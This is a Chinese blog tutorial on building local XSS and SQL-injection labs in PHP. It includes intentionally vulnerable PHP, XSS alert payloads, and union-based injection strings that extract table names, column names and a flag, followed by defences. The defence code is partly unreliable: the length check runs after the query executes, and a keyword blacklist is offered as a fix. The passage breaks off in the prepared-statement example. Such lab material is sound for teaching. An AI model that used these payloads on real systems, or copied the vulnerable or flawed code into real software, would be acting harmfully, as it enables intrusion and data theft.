    <content><![CDATA[<h1 id="xss和sql注入简单环境的搭建"><a href="#xss和sql注入简单环境的搭建" class="headerlink" title="xss和sql注入简单环境的搭建"></a>xss和sql注入简单环境的搭建</h1><p>以下环境都是基于PHP study搭建的，版本为 php 5.5.38+Apache</p>
<span id="more"></span>

<p>参考了dvwa的漏洞源码与攻击方式。</p>
<h2 id="xss漏洞的搭建"><a href="#xss漏洞的搭建" class="headerlink" title="xss漏洞的搭建"></a>xss漏洞的搭建</h2><h3 id="1-网页源码"><a href="#1-网页源码" class="headerlink" title="1.网页源码"></a>1.网页源码</h3><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
		&lt;title&gt;xss&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;center&gt;
			
			&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
				&lt;h6&gt;please input your name!&lt;/h6&gt;
				&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;br /&gt;
				&lt;input type=&#x27;submit&#x27; value=&quot;submit&quot; /&gt;
			&lt;/form&gt;
			
	
&lt;?php
  
function SafeFilter (&amp;$arr) 
&#123;
   $ra=Array(&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;,&#x27;/script/&#x27;,&#x27;/javascript/&#x27;,&#x27;/vbscript/&#x27;,&#x27;/expression/&#x27;,&#x27;/applet/&#x27;
   ,&#x27;/meta/&#x27;,&#x27;/xml/&#x27;,&#x27;/blink/&#x27;,&#x27;/link/&#x27;,&#x27;/style/&#x27;,&#x27;/embed/&#x27;,&#x27;/object/&#x27;,&#x27;/frame/&#x27;,&#x27;/layer/&#x27;,&#x27;/title/&#x27;,&#x27;/bgsound/&#x27;
   ,&#x27;/base/&#x27;,&#x27;/onload/&#x27;,&#x27;/onunload/&#x27;,&#x27;/onchange/&#x27;,&#x27;/onsubmit/&#x27;,&#x27;/onreset/&#x27;,&#x27;/onselect/&#x27;,&#x27;/onblur/&#x27;,&#x27;/onfocus/&#x27;,
   &#x27;/onabort/&#x27;,&#x27;/onkeydown/&#x27;,&#x27;/onkeypress/&#x27;,&#x27;/onkeyup/&#x27;,&#x27;/onclick/&#x27;,&#x27;/ondblclick/&#x27;,&#x27;/onmousedown/&#x27;,&#x27;/onmousemove/&#x27;
   ,&#x27;/onmouseout/&#x27;,&#x27;/onmouseover/&#x27;,&#x27;/onmouseup/&#x27;,&#x27;/onunload/&#x27;);
     
   if (is_array($arr))
   &#123;
     foreach ($arr as $key =&gt; $value) 
     &#123;
        if (!is_array($value))
        &#123;
          if (!get_magic_quotes_gpc())  //不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。
          &#123;
             $value  = addslashes($value); //给单引号（&#x27;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义
          &#125;
          $value       = preg_replace($ra,&#x27;&#x27;,$value);     //删除非打印字符，粗暴式过滤xss可疑字符串
          $arr[$key]     = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体
        &#125;
        else
        &#123;
          SafeFilter($arr[$key]);
        &#125;
     &#125;
   &#125;
&#125;
//php防注入和XSS攻击通用过滤
$_POST    &amp;&amp; SafeFilter($_POST);

			if (isset($_POST[&#x27;username&#x27;]))
			&#123;
				$s=$_POST[&#x27;username&#x27;];
				
				echo $s;

			&#125;
			
?&gt;
	&lt;/center&gt;
		
		&lt;/script&gt;
	&lt;/body&gt;
&lt;/html&gt;</code></pre>

<p>网页源码十分简单，就是用户输入所要查询的username，之后将其输入的内容打印出来。</p>
<p>起初并没有对用户的输入进行处理，直接执行了<code>echo</code>，造成了xss漏洞的出现。</p>
<h3 id="2-攻击效果"><a href="#2-攻击效果" class="headerlink" title="2.攻击效果"></a>2.攻击效果</h3><p>在输入栏中输入以下</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/xsss/)</span>&gt;</span></code></pre>

<p><img src="https://i.loli.net/2020/11/12/4f6rKtjU8sg7IoT.png" alt="xss.png"></p>
<p><img src="https://i.loli.net/2020/11/12/EAnVq5yv4ZWJo8z.png" alt="xss1.png"></p>
<h3 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><p>修复漏洞只需要对用户的输入内容进行检测和过滤，并将一些可能造成攻击的特殊字符进行转义，让其不起到原本的作用。</p>
<p>过滤函数如下</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SafeFilter</span> (<span class="hljs-params">&amp;<span class="hljs-variable">$arr</span></span>) </span>
<span class="hljs-function"></span>&#123;
   <span class="hljs-variable">$ra</span>=<span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>,<span class="hljs-string">&#x27;/script/&#x27;</span>,<span class="hljs-string">&#x27;/javascript/&#x27;</span>,<span class="hljs-string">&#x27;/vbscript/&#x27;</span>,<span class="hljs-string">&#x27;/expression/&#x27;</span>,<span class="hljs-string">&#x27;/applet/&#x27;</span>
   ,<span class="hljs-string">&#x27;/meta/&#x27;</span>,<span class="hljs-string">&#x27;/xml/&#x27;</span>,<span class="hljs-string">&#x27;/blink/&#x27;</span>,<span class="hljs-string">&#x27;/link/&#x27;</span>,<span class="hljs-string">&#x27;/style/&#x27;</span>,<span class="hljs-string">&#x27;/embed/&#x27;</span>,<span class="hljs-string">&#x27;/object/&#x27;</span>,<span class="hljs-string">&#x27;/frame/&#x27;</span>,<span class="hljs-string">&#x27;/layer/&#x27;</span>,<span class="hljs-string">&#x27;/title/&#x27;</span>,<span class="hljs-string">&#x27;/bgsound/&#x27;</span>
   ,<span class="hljs-string">&#x27;/base/&#x27;</span>,<span class="hljs-string">&#x27;/onload/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>,<span class="hljs-string">&#x27;/onchange/&#x27;</span>,<span class="hljs-string">&#x27;/onsubmit/&#x27;</span>,<span class="hljs-string">&#x27;/onreset/&#x27;</span>,<span class="hljs-string">&#x27;/onselect/&#x27;</span>,<span class="hljs-string">&#x27;/onblur/&#x27;</span>,<span class="hljs-string">&#x27;/onfocus/&#x27;</span>,
   <span class="hljs-string">&#x27;/onabort/&#x27;</span>,<span class="hljs-string">&#x27;/onkeydown/&#x27;</span>,<span class="hljs-string">&#x27;/onkeypress/&#x27;</span>,<span class="hljs-string">&#x27;/onkeyup/&#x27;</span>,<span class="hljs-string">&#x27;/onclick/&#x27;</span>,<span class="hljs-string">&#x27;/ondblclick/&#x27;</span>,<span class="hljs-string">&#x27;/onmousedown/&#x27;</span>,<span class="hljs-string">&#x27;/onmousemove/&#x27;</span>
   ,<span class="hljs-string">&#x27;/onmouseout/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseover/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseup/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>);
     
   <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$arr</span>))
   &#123;
     <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) <span class="hljs-comment">//循环语句，挨个检测</span>
     &#123;
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>))
        &#123;
          <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>()) 
          &#123;
             <span class="hljs-variable">$value</span>  = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//给单引号（&#x27;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义</span>
          &#125;
          <span class="hljs-variable">$value</span>       = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$ra</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$value</span>);     <span class="hljs-comment">//删除非打印字符</span>
          <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]     = <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$value</span>)); <span class="hljs-comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span>
        &#125;
        <span class="hljs-keyword">else</span>
        &#123;
          <span class="hljs-title function_ invoke__">SafeFilter</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);
        &#125;
     &#125;
   &#125;
&#125;</code></pre>

<p><strong>各个函数功能如下：</strong></p>
<p><strong>magic_quotes_gpc</strong>函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误</p>
<p>在magic_quotes_gpc&#x3D;On的情况下，如果输入的数据有</p>
<p>单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。</p>
<p><strong>addslashes函数</strong></p>
<p><img src="https://i.loli.net/2020/11/12/W7m2yOvok3g6ZXA.png" alt="addslashes.png"></p>
<p><strong>htmlentities()</strong> 函数把字符转换为 HTML 实体。</p>
<h2 id="sql注入环境搭建与攻击"><a href="#sql注入环境搭建与攻击" class="headerlink" title="sql注入环境搭建与攻击"></a>sql注入环境搭建与攻击</h2><p>网页源码，最常见的登录页面，其中没有对用户名和密码进行过滤，就将其带入sql语句中查询造成了sql注入的出现。</p>
<p>login.php源码</p>
<pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;

&lt;html &gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
        &lt;title&gt;Sqli&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;body&gt;

&lt;div class=&quot;limiter&quot;&gt;
    &lt;div class=&quot;container-login100&quot;&gt;
        &lt;div class=&quot;wrap-login100 p-b-160 p-t-50&quot;&gt;
            &lt;form class=&quot;login100-form validate-form&quot; action=&quot;check.php&quot; method=&quot;post&quot;&gt;
					&lt;span class=&quot;login100-form-title p-b-43&quot;&gt;
						Account Login
					&lt;/span&gt;

                &lt;div class=&quot;wrap-input100 rs1 validate-input&quot; data-validate=&quot;Username is required&quot;&gt;
                    &lt;input class=&quot;input100&quot; type=&quot;text&quot; name=&quot;username&quot;&gt;
                    &lt;span class=&quot;label-input100&quot;&gt;Username&lt;/span&gt;
                &lt;/div&gt;


                &lt;div class=&quot;wrap-input100 rs2 validate-input&quot; data-validate=&quot;Password is required&quot;&gt;
                    &lt;input class=&quot;input100&quot; type=&quot;password&quot; name=&quot;password&quot;&gt;
                    &lt;span class=&quot;label-input100&quot;&gt;Password&lt;/span&gt;
                &lt;/div&gt;

                &lt;div class=&quot;container-login100-form-btn&quot;&gt;
                    &lt;button type=&quot;submit&quot; class=&quot;login100-form-btn&quot;&gt;
                        Sign in
                    &lt;/button&gt;
                &lt;/div&gt;

            &lt;/form&gt;
        &lt;/div&gt;

    &lt;/a&gt;

&lt;/div&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>

<p>check.php源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];

<span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>())&#123;
    <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());
    <span class="hljs-keyword">exit</span>();
&#125;
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$pwd</span>&#x27;&quot;</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$result</span>))
&#123;
	<span class="hljs-title function_ invoke__">printf</span> (<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);
       	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login success&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error&quot;</span>;
&#125;
<span class="hljs-comment">// echo &quot;&lt;/TABLE&gt;&quot;;</span>
<span class="hljs-comment">// echo &quot;&lt;/div&gt;&quot;;</span>
<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
<span class="hljs-meta">?&gt;</span></code></pre>

<p>逻辑很简单，在login.php页面提交用户名和密码，将username和password发送到check.php页面连接数据库检查用户是否合法，用户名和密码都正确则，打印出用户名和密码。</p>
<p>在数据库建立了一张users和flag表，便于注入。</p>
<p>表中的内容如下</p>
<p><img src="https://i.loli.net/2020/11/13/YACXPd9oOZvhfxN.png" alt="sql1.png"></p>
<p><img src="https://i.loli.net/2020/11/13/oTqy8WhX6CGwS9A.png" alt="sql2.png"></p>
<p><img src="https://i.loli.net/2020/11/13/ghDmGtqeQLCyNZz.png" alt="sql3.png"></p>
<h3 id="1-漏洞利用"><a href="#1-漏洞利用" class="headerlink" title="1.漏洞利用"></a>1.漏洞利用</h3><p>直接使用万能密码登陆</p>
<pre><code class="hljs apache"><span class="hljs-attribute">username</span>:<span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #
<span class="hljs-attribute">username</span>:<span class="hljs-number">111</span></code></pre>

<p>结果打印出了第一个用户的用户名和密码</p>
<p><img src="https://i.loli.net/2020/11/13/omqb2AzDvC4w69g.png" alt="sql4.png"></p>
<p>这个结果也说名了是字符型注入，接下来利用改注入点获取flag</p>
<h4 id="判断表有几列"><a href="#判断表有几列" class="headerlink" title="判断表有几列"></a>判断表有几列</h4><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span>
页面显示正常，而改为<span class="hljs-number">4</span>的时候网页出现报错，说明了只有三列
<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#</span></code></pre>



<h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span></code></pre>



<p>说明有两个显示位，选择其中一个位置进行注入即可。</p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(table_name),<span class="hljs-number">3</span> from information_schema.TABLES <span class="hljs-built_in">where</span> TABLE_SCHEMA=<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span></code></pre>

<p><img src="https://i.loli.net/2020/11/13/btQg6vFRZipUd1n.png" alt="sql6.png"></p>
<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(COLUMN_name),<span class="hljs-number">3</span> from information_schema.COLUMNS <span class="hljs-built_in">where</span> TABLE_NAME=&#x27;flag&#x27;<span class="hljs-meta">#</span></code></pre>

<p><img src="https://i.loli.net/2020/11/13/KlwToCWSGiau4FM.png" alt="sql7.png"></p>
<p>（fl4g是dvwa实验中建立没有删除，所以也显示出来了）</p>
<h4 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h4><pre><code class="hljs capnproto">&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(flag),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> flag<span class="hljs-comment">#</span></code></pre>

<p><img src="https://i.loli.net/2020/11/13/wIQmSv7oCeXVWiR.png" alt="sqlflag.png"></p>
<h3 id="2-漏洞防御"><a href="#2-漏洞防御" class="headerlink" title="2.漏洞防御"></a>2.漏洞防御</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a><strong>方法一：</strong></h4><p>最简单的方法对用户名和密码的长度限制，一般用户名的长度不超过十五个字符，而密码的长度一般不超过16个字符长度，所以对用户输入限制长度是最有效的方法之一。因为一般的注入语句都是超过十六个字符的，想要在十六个字符之内构造出有效的注入语句是一件很难的事情。</p>
<p>代码实现</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
<span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>())&#123;
    <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());
    <span class="hljs-keyword">exit</span>();
&#125;
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$pwd</span>&#x27;&quot;</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$pwd</span>)&gt;=<span class="hljs-number">16</span>||<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$uname</span>)&gt;=<span class="hljs-number">15</span>)
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;It is too long.&quot;</span>;
&#125;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$result</span>))
&#123;
	<span class="hljs-title function_ invoke__">printf</span> (<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);
       	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login success.&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error.&quot;</span>;
&#125;
<span class="hljs-comment">// echo &quot;&lt;/TABLE&gt;&quot;;</span>
<span class="hljs-comment">// echo &quot;&lt;/div&gt;&quot;;</span>
<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
<span class="hljs-meta">?&gt;</span></code></pre>



<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h4><p>对用户输入进行检测和过滤，将其输入的可能产生恶意行为的代码删除或者转义，使其失去原来的功能。</p>
<p>代码实现</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
<span class="hljs-comment">//echo &quot;select * from admin where passward=&#x27;$pwd&#x27; and name=&#x27;$uname&#x27;&lt;br/&gt;&quot;;</span>
<span class="hljs-comment">//echo &quot;&lt;hr&gt;&quot;;</span>

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span>(<span class="hljs-params"><span class="hljs-variable">$Sql_Str</span></span>) </span>&#123;<span class="hljs-comment">//自动过滤Sql的注入语句。</span>
   <span class="hljs-variable">$check</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;</span>,<span class="hljs-variable">$Sql_Str</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$check</span>) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;</span>;
        <span class="hljs-keyword">exit</span>();
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Sql_Str</span>;
    &#125;
&#125;
<span class="hljs-variable">$pwd</span>=<span class="hljs-title function_ invoke__">inject_check</span>(<span class="hljs-variable">$pwd</span>);
<span class="hljs-variable">$uname</span> = <span class="hljs-title function_ invoke__">inject_check</span>(<span class="hljs-variable">$uname</span>);
<span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>())&#123;
    <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());
    <span class="hljs-keyword">exit</span>();
&#125;
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$pwd</span>&#x27;&quot;</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;

<span class="hljs-comment">// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)</span>
<span class="hljs-comment">// &#123;</span>
<span class="hljs-comment">// 	echo &quot;It is too long.&quot;;</span>
<span class="hljs-comment">// &#125;</span>
<span class="hljs-comment">// else </span>
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$result</span>))
&#123;
	<span class="hljs-title function_ invoke__">printf</span> (<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);
       	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login success.&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error.&quot;</span>;
&#125;
<span class="hljs-comment">// echo &quot;&lt;/TABLE&gt;&quot;;</span>
<span class="hljs-comment">// echo &quot;&lt;/div&gt;&quot;;</span>
<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
<span class="hljs-meta">?&gt;</span></code></pre>

<p>过滤函数如下，其中将一般注入需要用到的函数和符号都过滤了。</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span>(<span class="hljs-params"><span class="hljs-variable">$Sql_Str</span></span>) </span>&#123;<span class="hljs-comment">//自动过滤Sql的注入语句。</span>
    <span class="hljs-variable">$check</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;</span>,<span class="hljs-variable">$Sql_Str</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$check</span>) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;</span>;
        <span class="hljs-keyword">exit</span>();
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Sql_Str</span>;
    &#125;
&#125;</code></pre>



<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a><strong>方法三</strong></h4><p>使用预编译语句</p>
<p>代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];

<span class="hljs-comment">// function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。</span>
<span class="hljs-comment">//     $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str);</span>
<span class="hljs-comment">//     if ($check) &#123;</span>
<span class="hljs-comment">//         echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;;</span>
<span class="hljs-comment">//         exit();</span>
<span class="hljs-comment">//     &#125;else&#123;</span>
<span class="hljs-comment">//         return $Sql_Str;</span>
<span class="hljs-comment">//     &#125;</span>
<span class="hljs-comment">// &#125;</span>
<span class="hljs-comment">// $pwd=inject_check($pwd);</span>
<span class="hljs-comment">// $uname = inject_check($uname);</span>
<span class="hljs-comment">// </span>

